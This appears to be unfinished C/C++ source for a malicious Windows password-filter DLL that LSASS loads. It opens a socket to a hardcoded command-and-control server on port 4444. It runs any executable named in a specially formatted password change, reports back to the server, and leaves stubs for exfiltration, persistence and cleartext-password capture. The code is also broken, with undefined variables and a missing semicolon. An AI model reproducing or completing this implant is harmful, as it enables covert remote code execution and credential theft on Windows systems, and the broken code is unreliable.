#include <windows.h>
#include <ntsecapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <cstdint>

// ---------------------------------------------------------------------
// C2 Stuff
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")  

#define SERVER_IP   "192.168.1.100"
#define SERVER_PORT 4444
#define RETRY_DELAY 10000  // milliseconds (10s)
// ---------------------------------------------------------------------

// ---------------------------------------------------------------------
// Message stuff to send to C2
#define MSG_COMMAND  0x01  // server -> agent: run this
#define MSG_RESULT   0x02  // agent -> server: output/result
#define MSG_LOG      0x03  // agent -> server: log entry
#define MSG_PING     0x04  // either direction: keepalive

typedef struct {
    uint8_t  type;
    uint32_t length;  // length of data that follows
    char     data[];  // flexible array, actual payload
} Message;

SOCKET g_sock = INVALID_SOCKET;
// ---------------------------------------------------------------------


SOCKET connect_to_server() {
    SOCKET sock;
    struct sockaddr_in addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return INVALID_SOCKET;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(SERVER_PORT);
    addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return INVALID_SOCKET;
    }

    return sock;
}

DWORD WINAPI recv_thread(LPVOID lpParam) {
    char buf[4096];
    int n;

    while ((n = recv(g_sock, buf, sizeof(buf) - 1, 0)) > 0) {
        buf[n] = '\0';
        // do something with the incoming command
        // e.g. log_to_server("got your message");
    }

    // if we get here the server disconnected
    g_sock = INVALID_SOCKET;
    return 0;
}

void log_to_server(const char* msg) {
    if (g_sock != INVALID_SOCKET)
        send(g_sock, msg, strlen(msg), 0);
}

DWORD WINAPI agent_thread(LPVOID lpParam) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    g_sock = connect_to_server();

    CloseHandle(CreateThread(NULL, 0, recv_thread, NULL, 0, NULL));

    // keep alive as before
    while (g_sock != INVALID_SOCKET) {
        Sleep(1000);
    }

    WSACleanup();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {

    if (fdwReason == DLL_PROCESS_ATTACH) {
        CloseHandle(CreateThread(NULL, 0, agent_thread, NULL, 0, NULL));
    }

    return TRUE;

}

// Called once when LSASS loads your DLL at boot
// Must return TRUE to signal successful initialization
BOOLEAN WINAPI InitializeChangeNotify(void) {
    log_to_server("LSASS has loaded my thing!");
    return TRUE;
}

// Called on every proposed password change
// Fails silently if c2 format is wrong
// Format: c2:<COMMAND>:<ARG1>:<ARG2>:...
BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING account_name, PUNICODE_STRING full_name, PUNICODE_STRING password, BOOLEAN set_operation) {
    wchar_t* tokens[16];  
    int count = 0;

    wchar_t* ctx;
    wchar_t* token = wcstok(myUnicodeString->Buffer, L":", &ctx);
    while (token != NULL && count < 16) {

        tokens[count++] = token;
        token = wcstok(NULL, L":", &ctx);
    
    }

    // check if it is a C2 command...
    if (wcscmp(tokens[0], L"c2") == 0 || wcscmp(tokens[0], L"C2") == 0){
        
        cmd = tokens[1];

        if (wcscmp(tokens[1], L"exec") == 0) {

            BOOL process_make_attempt = CreateProcessW(
                tokens[2],
                NULL,                                    // no extra args
                NULL, NULL,                              // default security
                FALSE,                                   // don't inherit handles
                0,                                       // no special flags
                NULL, NULL,                              // inherit env and cwd
                &si,
                &pi
            );
            if (!process_make_attempt){
                log_to_server("ATTEMPT TO EXEC FILE PATH FAILED!");
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }

            log_to_server("PROCESS HAS BEEN MADE FOR THE FILE YOU POINTED TO");
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

        } else if (wcscmp(tokens[1], L"exfil") == 0) {

            

        } else if (wcscmp(tokens[1], L"persist") == 0) {



        } else if (wcscmp(tokens[1], L"kill") == 0) {



        } else {
          
            log_to_server("Detected attempted C2 command: COMMAND WAS INALID")  
        
        }

    }

    return TRUE;
}

// Called after every successful password change
// Receives cleartext username and new password
// Return STATUS_SUCCESS (0) when done
NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING user_name, ULONG relative_id, PUNICODE_STRING new_password) {
    // TODO
}